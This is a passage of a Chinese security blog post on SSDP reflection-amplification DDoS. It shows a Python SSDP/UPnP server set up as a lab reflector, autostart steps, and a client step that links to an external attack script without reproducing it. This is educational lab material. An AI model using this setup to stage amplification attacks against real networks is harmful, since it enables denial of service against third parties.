methods are called when the appropriate type of</span><br><span class="line">    datagram is received by the server.&quot;&quot;&quot;</span><br><span class="line">    known = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.sock = None</span><br><span class="line"></span><br><span class="line">    def run(self):</span><br><span class="line">        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</span><br><span class="line">        if hasattr(socket, &quot;SO_REUSEPORT&quot;):</span><br><span class="line">            try:</span><br><span class="line">                self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)</span><br><span class="line">            except socket.error as le:</span><br><span class="line">                # RHEL6 defines SO_REUSEPORT but it doesn&apos;t work</span><br><span class="line">                if le.errno == ENOPROTOOPT:</span><br><span class="line">                    pass</span><br><span class="line">                else:</span><br><span class="line">                    raise</span><br><span class="line"></span><br><span class="line">        addr = socket.inet_aton(SSDP_ADDR)</span><br><span class="line">        interface = socket.inet_aton(&apos;0.0.0.0&apos;)</span><br><span class="line">        cmd = socket.IP_ADD_MEMBERSHIP</span><br><span class="line">        self.sock.setsockopt(socket.IPPROTO_IP, cmd, addr + interface)</span><br><span class="line">        self.sock.bind((&apos;0.0.0.0&apos;, SSDP_PORT))</span><br><span class="line">        self.sock.settimeout(1)</span><br><span class="line"></span><br><span class="line">        while True:</span><br><span class="line">            try:</span><br><span class="line">                data, addr = self.sock.recvfrom(1024)</span><br><span class="line">                self.datagram_received(data, addr)</span><br><span class="line">            except socket.timeout:</span><br><span class="line">                continue</span><br><span class="line">        self.shutdown()</span><br><span class="line"></span><br><span class="line">    def shutdown(self):</span><br><span class="line">        for st in self.known:</span><br><span class="line">            if self.known[st][&apos;MANIFESTATION&apos;] == &apos;local&apos;:</span><br><span class="line">                self.do_byebye(st)</span><br><span class="line"></span><br><span class="line">    def datagram_received(self, data, host_port):</span><br><span class="line">        &quot;&quot;&quot;Handle a received multicast datagram.&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">        (host, port) = host_port</span><br><span class="line"></span><br><span class="line">        try:</span><br><span class="line">            header, payload = data.decode().split(&apos;\r\n\r\n&apos;)[:2]</span><br><span class="line">        except ValueError as err:</span><br><span class="line">            logger.error(err)</span><br><span class="line">            return</span><br><span class="line"></span><br><span class="line">        lines = header.split(&apos;\r\n&apos;)</span><br><span class="line">        cmd = lines[0].split(&apos; &apos;)</span><br><span class="line">        lines = map(lambda x: x.replace(&apos;: &apos;, &apos;:&apos;, 1), lines[1:])</span><br><span class="line">        lines = filter(lambda x: len(x) &gt; 0, lines)</span><br><span class="line"></span><br><span class="line">        headers = [x.split(&apos;:&apos;, 1) for x in lines]</span><br><span class="line">        headers = dict(map(lambda x: (x[0].lower(), x[1]), headers))</span><br><span class="line"></span><br><span class="line">        logger.info(&apos;SSDP command %s %s - from %s:%d&apos; % (cmd[0], cmd[1], host, port))</span><br><span class="line">        logger.debug(&apos;with headers: &#123;&#125;.&apos;.format(headers))</span><br><span class="line">        if cmd[0] == &apos;M-SEARCH&apos; and cmd[1] == &apos;*&apos;:</span><br><span class="line">            # SSDP discovery</span><br><span class="line">            self.discovery_request(headers, (host, port))</span><br><span class="line">        elif cmd[0] == &apos;NOTIFY&apos; and cmd[1] == &apos;*&apos;:</span><br><span class="line">            # SSDP presence</span><br><span class="line">            logger.debug(&apos;NOTIFY *&apos;)</span><br><span class="line">        else:</span><br><span class="line">            logger.warning(&apos;Unknown SSDP command %s %s&apos; % (cmd[0], cmd[1]))</span><br><span class="line"></span><br><span class="line">    def register(self, manifestation, usn, st, location, server=SERVER_ID, cache_control=&apos;max-age=1800&apos;, silent=False,</span><br><span class="line">                 host=None):</span><br><span class="line">        &quot;&quot;&quot;Register a service or device that this SSDP server will</span><br><span class="line">        respond to.&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">        logging.info(&apos;Registering %s (%s)&apos; % (st, location))</span><br><span class="line"></span><br><span class="line">        self.known[usn] = &#123;&#125;</span><br><span class="line">        self.known[usn][&apos;USN&apos;] = usn</span><br><span class="line">        self.known[usn][&apos;LOCATION&apos;] = location</span><br><span class="line">        self.known[usn][&apos;ST&apos;] = st</span><br><span class="line">        self.known[usn][&apos;EXT&apos;] = &apos;&apos;</span><br><span class="line">        self.known[usn][&apos;SERVER&apos;] = server</span><br><span class="line">        self.known[usn][&apos;CACHE-CONTROL&apos;] = cache_control</span><br><span class="line"></span><br><span class="line">        self.known[usn][&apos;MANIFESTATION&apos;] = manifestation</span><br><span class="line">        self.known[usn][&apos;SILENT&apos;] = silent</span><br><span class="line">        self.known[usn][&apos;HOST&apos;] = host</span><br><span class="line">        self.known[usn][&apos;last-seen&apos;] = time.time()</span><br><span class="line"></span><br><span class="line">        if manifestation == &apos;local&apos; and self.sock:</span><br><span class="line">            self.do_notify(usn)</span><br><span class="line"></span><br><span class="line">    def unregister(self, usn):</span><br><span class="line">        logger.info(&quot;Un-registering %s&quot; % usn)</span><br><span class="line">        del self.known[usn]</span><br><span class="line"></span><br><span class="line">    def is_known(self, usn):</span><br><span class="line">        return usn in self.known</span><br><span class="line"></span><br><span class="line">    def send_it(self, response, destination, delay, usn):</span><br><span class="line">        logger.debug(&apos;send discovery response delayed by %ds for %s to %r&apos; % (delay, usn, destination))</span><br><span class="line">        try:</span><br><span class="line">            self.sock.sendto(response.encode(), destination)</span><br><span class="line">        except (AttributeError, socket.error) as msg:</span><br><span class="line">            logger.warning(&quot;failure sending out byebye notification: %r&quot; % msg)</span><br><span class="line"></span><br><span class="line">    def discovery_request(self, headers, host_port):</span><br><span class="line">        &quot;&quot;&quot;Process a discovery request.  The response must be sent to</span><br><span class="line">        the address specified by (host, port).&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">        (host, port) = host_port</span><br><span class="line"></span><br><span class="line">        logger.info(&apos;Discovery request from (%s,%d) for %s&apos; % (host, port, headers[&apos;st&apos;]))</span><br><span class="line">        logger.info(&apos;Discovery request for %s&apos; % headers[&apos;st&apos;])</span><br><span class="line"></span><br><span class="line">        # Do we know about this service?</span><br><span class="line">        for i in self.known.values():</span><br><span class="line">            if i[&apos;MANIFESTATION&apos;] == &apos;remote&apos;:</span><br><span class="line">                continue</span><br><span class="line">            if headers[&apos;st&apos;] == &apos;ssdp:all&apos; and i[&apos;SILENT&apos;]:</span><br><span class="line">                continue</span><br><span class="line">            if i[&apos;ST&apos;] == headers[&apos;st&apos;] or headers[&apos;st&apos;] == &apos;ssdp:all&apos;:</span><br><span class="line">                response = [&apos;HTTP/1.1 200 OK&apos;]</span><br><span class="line"></span><br><span class="line">                usn = None</span><br><span class="line">                for k, v in i.items():</span><br><span class="line">                    if k == &apos;USN&apos;:</span><br><span class="line">                        usn = v</span><br><span class="line">                    if k not in (&apos;MANIFESTATION&apos;, &apos;SILENT&apos;, &apos;HOST&apos;):</span><br><span class="line">                        response.append(&apos;%s: %s&apos; % (k, v))</span><br><span class="line"></span><br><span class="line">                if usn:</span><br><span class="line">                    response.append(&apos;DATE: %s&apos; % formatdate(timeval=None, localtime=False, usegmt=True))</span><br><span class="line"></span><br><span class="line">                    response.extend((&apos;&apos;, &apos;&apos;))</span><br><span class="line">                    delay = random.randint(0, int(headers[&apos;mx&apos;]))</span><br><span class="line"></span><br><span class="line">                    self.send_it(&apos;\r\n&apos;.join(response), (host, port), delay, usn)</span><br><span class="line"></span><br><span class="line">    def do_notify(self, usn):</span><br><span class="line">        &quot;&quot;&quot;Do notification&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">        if self.known[usn][&apos;SILENT&apos;]:</span><br><span class="line">            return</span><br><span class="line">        logger.info(&apos;Sending alive notification for %s&apos; % usn)</span><br><span class="line"></span><br><span class="line">        resp = [</span><br><span class="line">            &apos;NOTIFY * HTTP/1.1&apos;,</span><br><span class="line">            &apos;HOST: %s:%d&apos; % (SSDP_ADDR, SSDP_PORT),</span><br><span class="line">            &apos;NTS: ssdp:alive&apos;,</span><br><span class="line">        ]</span><br><span class="line">        stcpy = dict(self.known[usn].items())</span><br><span class="line">        stcpy[&apos;NT&apos;] = stcpy[&apos;ST&apos;]</span><br><span class="line">        del stcpy[&apos;ST&apos;]</span><br><span class="line">        del stcpy[&apos;MANIFESTATION&apos;]</span><br><span class="line">        del stcpy[&apos;SILENT&apos;]</span><br><span class="line">        del stcpy[&apos;HOST&apos;]</span><br><span class="line">        del stcpy[&apos;last-seen&apos;]</span><br><span class="line"></span><br><span class="line">        resp.extend(map(lambda x: &apos;: &apos;.join(x), stcpy.items()))</span><br><span class="line">        resp.extend((&apos;&apos;, &apos;&apos;))</span><br><span class="line">        logger.debug(&apos;do_notify content&apos;, resp)</span><br><span class="line">        try:</span><br><span class="line">            self.sock.sendto(&apos;\r\n&apos;.join(resp).encode(), (SSDP_ADDR, SSDP_PORT))</span><br><span class="line">            self.sock.sendto(&apos;\r\n&apos;.join(resp).encode(), (SSDP_ADDR, SSDP_PORT))</span><br><span class="line">        except (AttributeError, socket.error) as msg:</span><br><span class="line">            logger.warning(&quot;failure sending out alive notification: %r&quot; % msg)</span><br><span class="line"></span><br><span class="line">    def do_byebye(self, usn):</span><br><span class="line">        &quot;&quot;&quot;Do byebye&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">        logger.info(&apos;Sending byebye notification for %s&apos; % usn)</span><br><span class="line"></span><br><span class="line">        resp = [</span><br><span class="line">            &apos;NOTIFY * HTTP/1.1&apos;,</span><br><span class="line">            &apos;HOST: %s:%d&apos; % (SSDP_ADDR, SSDP_PORT),</span><br><span class="line">            &apos;NTS: ssdp:byebye&apos;,</span><br><span class="line">        ]</span><br><span class="line">        try:</span><br><span class="line">            stcpy = dict(self.known[usn].items())</span><br><span class="line">            stcpy[&apos;NT&apos;] = stcpy[&apos;ST&apos;]</span><br><span class="line">            del stcpy[&apos;ST&apos;]</span><br><span class="line">            del stcpy[&apos;MANIFESTATION&apos;]</span><br><span class="line">            del stcpy[&apos;SILENT&apos;]</span><br><span class="line">            del stcpy[&apos;HOST&apos;]</span><br><span class="line">            del stcpy[&apos;last-seen&apos;]</span><br><span class="line">            resp.extend(map(lambda x: &apos;: &apos;.join(x), stcpy.items()))</span><br><span class="line">            resp.extend((&apos;&apos;, &apos;&apos;))</span><br><span class="line">            logger.debug(&apos;do_byebye content&apos;, resp)</span><br><span class="line">            if self.sock:</span><br><span class="line">                try:</span><br><span class="line">                    self.sock.sendto(&apos;\r\n&apos;.join(resp), (SSDP_ADDR, SSDP_PORT))</span><br><span class="line">                except (AttributeError, socket.error) as msg:</span><br><span class="line">                    logger.error(&quot;failure sending out byebye notification: %r&quot; % msg)</span><br><span class="line">        except KeyError as msg:</span><br><span class="line">            logger.error(&quot;error building byebye notification: %r&quot; % msg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class UPNPHTTPServerHandler(BaseHTTPRequestHandler):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    A HTTP handler that serves the UPnP XML files.</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    # Handler for the GET requests</span><br><span class="line">    def do_GET(self):</span><br><span class="line"></span><br><span class="line">        if self.path == &apos;/boucherie_wsd.xml&apos;:</span><br><span class="line">            self.send_response(200)</span><br><span class="line">            self.send_header(&apos;Content-type&apos;, &apos;application/xml&apos;)</span><br><span class="line">            self.end_headers()</span><br><span class="line">            self.wfile.write(self.get_wsd_xml().encode())</span><br><span class="line">            return</span><br><span class="line">        if self.path == &apos;/jambon-3000.xml&apos;:</span><br><span class="line">            self.send_response(200)</span><br><span class="line">            self.send_header(&apos;Content-type&apos;, &apos;application/xml&apos;)</span><br><span class="line">            self.end_headers()</span><br><span class="line">            self.wfile.write(self.get_device_xml().encode())</span><br><span class="line">            return</span><br><span class="line">        else:</span><br><span class="line">            self.send_response(404)</span><br><span class="line">            self.send_header(&apos;Content-type&apos;, &apos;text/html&apos;)</span><br><span class="line">            self.end_headers()</span><br><span class="line">            self.wfile.write(b&quot;Not found.&quot;)</span><br><span class="line">            return</span><br><span class="line"></span><br><span class="line">    def get_device_xml(self):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        Get the main device descriptor xml file.</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        xml = &quot;&quot;&quot;&lt;root&gt;</span><br><span class="line">    &lt;specVersion&gt;</span><br><span class="line">        &lt;major&gt;1&lt;/major&gt;</span><br><span class="line">        &lt;minor&gt;0&lt;/minor&gt;</span><br><span class="line">    &lt;/specVersion&gt;</span><br><span class="line">    &lt;device&gt;</span><br><span class="line">        &lt;deviceType&gt;urn:schemas-upnp-org:device:Basic:1&lt;/deviceType&gt;</span><br><span class="line">        &lt;friendlyName&gt;&#123;friendly_name&#125;&lt;/friendlyName&gt;</span><br><span class="line">        &lt;UDN&gt;uuid:&#123;uuid&#125;&lt;/UDN&gt;</span><br><span class="line">        &lt;serviceList&gt;</span><br><span class="line">            &lt;service&gt;</span><br><span class="line">                &lt;URLBase&gt;http://xxx.yyy.zzz.aaaa:5000&lt;/URLBase&gt;</span><br><span class="line">                &lt;serviceType&gt;urn:boucherie.example.com:service:Jambon:1&lt;/serviceType&gt;</span><br><span class="line">                &lt;serviceId&gt;urn:boucherie.example.com:serviceId:Jambon&lt;/serviceId&gt;</span><br><span class="line">                &lt;controlURL&gt;/jambon&lt;/controlURL&gt;</span><br><span class="line">                &lt;eventSubURL/&gt;</span><br><span class="line">                &lt;SCPDURL&gt;/boucherie_wsd.xml&lt;/SCPDURL&gt;</span><br><span class="line">            &lt;/service&gt;</span><br><span class="line">        &lt;/serviceList&gt;</span><br><span class="line">        &lt;presentationURL&gt;&#123;presentation_url&#125;&lt;/presentationURL&gt;</span><br><span class="line">    &lt;/device&gt;</span><br><span class="line">&lt;/root&gt;&quot;&quot;&quot;</span><br><span class="line">        return xml.format(friendly_name=self.server.friendly_name,</span><br><span class="line">                          manufacturer=self.server.manufacturer,</span><br><span class="line">                          manufacturer_url=self.server.manufacturer_url,</span><br><span class="line">                          model_description=self.server.model_description,</span><br><span class="line">                          model_name=self.server.model_name,</span><br><span class="line">                          model_number=self.server.model_number,</span><br><span class="line">                          model_url=self.server.model_url,</span><br><span class="line">                          serial_number=self.server.serial_number,</span><br><span class="line">                          uuid=self.server.uuid,</span><br><span class="line">                          presentation_url=self.server.presentation_url)</span><br><span class="line"></span><br><span class="line">    @staticmethod</span><br><span class="line">    def get_wsd_xml():</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        Get the device WSD file.</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        return &quot;&quot;&quot;&lt;scpd xmlns=&quot;urn:schemas-upnp-org:service-1-0&quot;&gt;</span><br><span class="line">&lt;specVersion&gt;</span><br><span class="line">&lt;major&gt;1&lt;/major&gt;</span><br><span class="line">&lt;minor&gt;0&lt;/minor&gt;</span><br><span class="line">&lt;/specVersion&gt;</span><br><span class="line">&lt;/scpd&gt;&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class UPNPHTTPServerBase(HTTPServer):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    A simple HTTP server that knows the information about a UPnP device.</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    def __init__(self, server_address, request_handler_class):</span><br><span class="line">        HTTPServer.__init__(self, server_address, request_handler_class)</span><br><span class="line">        self.port = None</span><br><span class="line">        self.friendly_name = None</span><br><span class="line">        self.uuid = None</span><br><span class="line">        self.presentation_url = None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class UPNPHTTPServer(threading.Thread):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    A thread that runs UPNPHTTPServerBase.</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    def __init__(self, port, friendly_name, uuid, presentation_url):</span><br><span class="line">        threading.Thread.__init__(self, daemon=True)</span><br><span class="line">        self.server = UPNPHTTPServerBase((&apos;&apos;, port), UPNPHTTPServerHandler)</span><br><span class="line">        self.server.port = port</span><br><span class="line">        self.server.friendly_name = friendly_name</span><br><span class="line">        self.server.uuid = uuid</span><br><span class="line">        self.server.presentation_url = presentation_url</span><br><span class="line"></span><br><span class="line">    def run(self):</span><br><span class="line">        self.server.serve_forever()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">logger1 = logging.getLogger()</span><br><span class="line">logger1.setLevel(logging.DEBUG)</span><br><span class="line"></span><br><span class="line">def get_network_interface_ip_address(interface=&apos;eth1&apos;):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Get the first IP address of a network interface.</span><br><span class="line">    :param interface: The name of the interface.</span><br><span class="line">    :return: The IP address.</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    while True:</span><br><span class="line">        if NETWORK_INTERFACE not in ni.interfaces():</span><br><span class="line">            logger1.error(&apos;Could not find interface %s.&apos; % (interface,))</span><br><span class="line">            exit(1)</span><br><span class="line">        interface = ni.ifaddresses(interface)</span><br><span class="line">        if (2 not in interface) or (len(interface[2]) == 0):</span><br><span class="line">            logger1.warning(&apos;Could not find IP of interface %s. Sleeping.&apos; % (interface,))</span><br><span class="line">            sleep(60)</span><br><span class="line">            continue</span><br><span class="line">        return interface[2][0][&apos;addr&apos;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">device_uuid = uuid.uuid4()</span><br><span class="line">local_ip_address = get_network_interface_ip_address(NETWORK_INTERFACE)</span><br><span class="line"></span><br><span class="line">http_server = UPNPHTTPServer(8088,</span><br><span class="line">                             friendly_name=&quot;Jambon 3000&quot;,</span><br><span class="line">                             uuid=device_uuid,</span><br><span class="line">                             presentation_url=&quot;http://&#123;&#125;:5000/&quot;.format(local_ip_address))</span><br><span class="line">http_server.start()</span><br><span class="line"></span><br><span class="line">ssdp = SSDPServer()</span><br><span class="line">ssdp.register(&apos;local&apos;,</span><br><span class="line">              &apos;uuid:&#123;&#125;::upnp:rootdevice&apos;.format(device_uuid),</span><br><span class="line">              &apos;upnp:rootdevice&apos;,</span><br><span class="line">              &apos;http://&#123;&#125;:8088/jambon-3000.xml&apos;.format(local_ip_address))</span><br><span class="line">ssdp.run()</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>构造开机自启脚本<code>auto.sh</code></li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ssdp_server.py</span><br></pre></td></tr></table></figure>
<p>添加执行权限<code>chmod 755 ssdp_server.py</code></p>
<p>写入开机自启动<code>vim /etc/rc.d/rc.local</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash /root/auto.sh</span><br></pre></td></tr></table></figure>
<p><img src="/2020/10/25/反射放大DDos/5.png" alt="ssdp_server"></p>
<h4 id="客户端-1"><a href="#客户端-1" class="headerlink" title="客户端"></a>客户端</h4><ol>
<li>查看路由，并调整为服务端可达，安装实验环境</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y vim</span><br></pre></td></tr></table></figure>
<ol start="2">
<li><p>部署攻击脚本<code>ssdp_attack.py</code>，攻击脚本可通过理解协议完成构造，可参考<a href="https://gist.github.com/fr4nk404/500263f6c4b455c3d03239a3d3aa1f53" target="_blank" rel="noopener">ssdp_attack</a></p>
</li>
<li><p>指定网段网卡，并运行。测试成功，服务端不断刷新回显。</p>
</li>
</ol>
</div><iframe src="/donate/?AliPayQR=img/alipay.jpg&amp;WeChatQR=img/wechat.jpg&amp;GitHub=https://github.com/fr4nk404&amp;BTCQR=img/btc.jpg&amp;BTCKEY=1DgCePEwFFHwJm9bmAiv1rpgtp8AqGw3aq&amp;PayPal=undefined" style="overflow-x:hidden; overflow-y:hidden; border:0xp none #fff; min-height:240px; width:100%;" frameborder="0" scrolling="no"></iframe><div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>fr4nk404</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="/2020/10/25/反射放大DDos/">https://fr4nk404.github.io/2020/10/25/反射放大DDos/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>Copyright © 2019 fr4nk404's Blog. Powered by Hexo. Theme by Cho.</li></ul></div><br><div class="tags"><a href="/tags/DDoS/">DDoS</a></div><div class="post-nav"><a class="pre" href="/2020/11/03/白盒扫描技术综述/">白盒扫描技术简介</a><a class="next" href="/2020/10/10/我的2021届校招/">我的2021届校招</a></div><div id="disqus_thread"><div class="btn_click_load"><button class="disqus_click_btn">阅读评论（请确保 Disqus 可以正常加载）</button></div><script type="text/javascript">var disqus_config = function () {
    this.page.url = 'https://fr4nk404.github.io/2020/10/25/反射放大DDos/';
    this.page.identifier = '2020/10/25/反射放大DDos/';
    this.page.title = '反射放大DDoS';
  };</script><script type="text/javascript" id="disqus-lazy-load-script">$.ajax({
url: 'https://disqus.com/next/config.json',
timeout: 2500,
type: 'GET',
success: function(){
  var d = document;
  var s = d.createElement('script');
  s.src = '//Fr4nk404.disqus.com/embed.js';
  s.setAttribute('data-timestamp', + new Date());
  (d.head || d.body).appendChild(s);
  $('.disqus_click_btn').css('display', 'none');
},
error: function() {
  $('.disqus_click_btn').css('display', 'block');
}
});</script><script type="text/javascript" id="disqus-click-load">$('.btn_click_load').click(() => {  //click to load comments
    (() => { // DON'T EDIT BELOW THIS LINE
        var d = document;
        var s = d.createElement('script');
        s.src = '//Fr4nk404.disqus.com/embed.js';
        s.setAttribute('data-timestamp', + new Date());
        (d.head || d.body).appendChild(s);
    })();
    $('.disqus_click_btn').css('display','none');
});</script><script type="text/javascript" id="disqus-count-script">$(function() {
     var xhr = new XMLHttpRequest();
     xhr.open('GET', '//disqus.com/next/config.json', true);
     xhr.timeout = 2500;
     xhr.onreadystatechange = function () {
       if (xhr.readyState === 4 && xhr.status === 200) {
         $('.post-meta .post-comments-count').show();
         var s = document.createElement('script');
         s.id = 'dsq-count-scr';
         s.src = 'https://Fr4nk404.disqus.com/count.js';
         s.async = true;
         (document.head || document.body).appendChild(s);
       }
     };
     xhr.ontimeout = function () { xhr.abort(); };
     xhr.send(null);
   });
</script></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank"><input type="text" name="q" maxlength="20" placeholder="Search"><input type="hidden" name="sitesearch" value="https://fr4nk404.github.io"></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Daily/">Daily</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Interesting/">Interesting</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Security/">Security</a><span class="category-list-count">7</span></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/VulnExploit/" style="font-size: 15px;">VulnExploit</a> <a href="/tags/bb/" style="font-size: 15px;">bb</a> <a href="/tags/DailyUse/" style="font-size: 15px;">DailyUse</a> <a href="/tags/Web/" style="font-size: 15px;">Web</a> <a href="/tags/https/" style="font-size: 15px;">https</a> <a href="/tags/DDoS/" style="font-size: 15px;">DDoS</a> <a href="/tags/Pentest/" style="font-size: 15px;">Pentest</a> <a href="/tags/Daily/" style="font-size: 15px;">Daily</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最近文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/11/03/白盒扫描技术综述/">白盒扫描技术简介</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/25/反射放大DDos/">反射放大DDoS</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/10/我的2021届校招/">我的2021届校招</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/01/轰炸漏洞小结/">浅谈轰炸漏洞攻防思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/23/HexoTheme-Optimization/">HexoTheme Optimization</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/20/CVE-2019-12136/">CVE-2019-12136</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/21/ss-NG-switchyOmega+Outline/">Shadowsocks+SwitchyOmega+Outline</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/21/HHB/">平头哥HHB</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/31/EduSRC挖洞小结/">EduSRC挖洞小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/01/Web指纹识别/">Web指纹识别</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-comment-o"> 最近评论</i></div><script type="text/javascript" src="//Fr4nk404.disqus.com/recent_comments_widget.js?num_items=5&amp;hide_avatars=1&amp;avatar_size=32&amp;excerpt_length=20&amp;hide_mods=1"></script></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="https://hexo.imagemlt.xyz/" title="Imagemlt" target="_blank">Imagemlt</a><ul></ul><a href="http://blog.0kami.cn/" title="wh1t3p1g" target="_blank">wh1t3p1g</a><ul></ul><a href="http://www.recorday.cn/" title="C0d3r1iu" target="_blank">C0d3r1iu</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2021 <a href="/." rel="nofollow">Fr4nk404.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=1.0.0" async></script><script type="text/javascript" src="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=1.0.0" async></script><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css"><script type="text/javascript" color="0,0,0" opacity="0.5" zindex="-2" count="50" src="//lib.baomitu.com/canvas-nest.js/2.0.4/canvas-nest.umd.js"></script><script type="text/javascript" src="/js/codeblock-resizer.js?v=1.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=1.0.0"></script></div></body></html>